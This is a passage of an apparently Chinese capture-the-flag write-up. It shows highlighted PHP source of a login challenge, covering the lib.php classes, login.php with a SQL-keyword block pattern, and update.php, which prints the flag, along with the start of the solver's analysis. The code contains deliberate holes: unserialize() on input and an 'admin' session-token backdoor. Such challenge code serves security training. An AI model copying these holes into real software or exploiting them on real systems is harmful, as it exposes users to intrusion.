punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">Class</span> <span class=\"token class-name-definition class-name\">UpdateHelper</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$newinfo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$newInfo</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$newInfo</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token variable\">$upDate</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">sql</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dbCtrl</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$hostname</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbuser</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dbpass</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$database</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"noob123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$mysqli</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"连接失败，错误:\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_param</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'s'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">bind_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$idResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户不存在!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token variable\">$passwordResult</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'密码错误！'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$idResult</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token comment\">// 还没来得及写</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>login.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>login<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>login.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 300</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>百万前端的用户信息管理系统<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h3</span><span class=\"token punctuation\">&gt;</span></span>半成品系统 留后门的程序员已经跑路<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h3</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        \t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>username<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UserName<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span> 20</span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">placeholder</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">required</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">margin-top</span><span class=\"token punctuation\">:</span>20<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>登录<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>img/1.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">&gt;</span></span>大家记得做好防护<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>img</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Damn you, hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token variable\">$user</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">&gt;</span></span></pre></td></tr></tbody></table></figure><p>update.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'lib.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;html&gt;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;meta charset=\"utf-8\"&gt;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;title&gt;update&lt;/title&gt;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>&lt;/html&gt;'<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你还没有登陆呢！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$users</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>大致浏览一下源码，很明显可以知道唯一获得 flag 的方式在 <code>update.php</code>  中的 <code>echo $flag;</code> ，要想进入语句，就要使 <code>$_SESSION['login']===1</code>  成立，而这一语句成立的位置为 <code>User</code>  类的 <code>login</code>  方法，对  <code>$_SESSION['login']</code>  进行赋值，但在进行该语句前，又会进入 <code>dbCtrl</code>  类的 <code>login</code>  方法中，查看此处 <code>login</code>  的逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbuser</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dbpass</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span 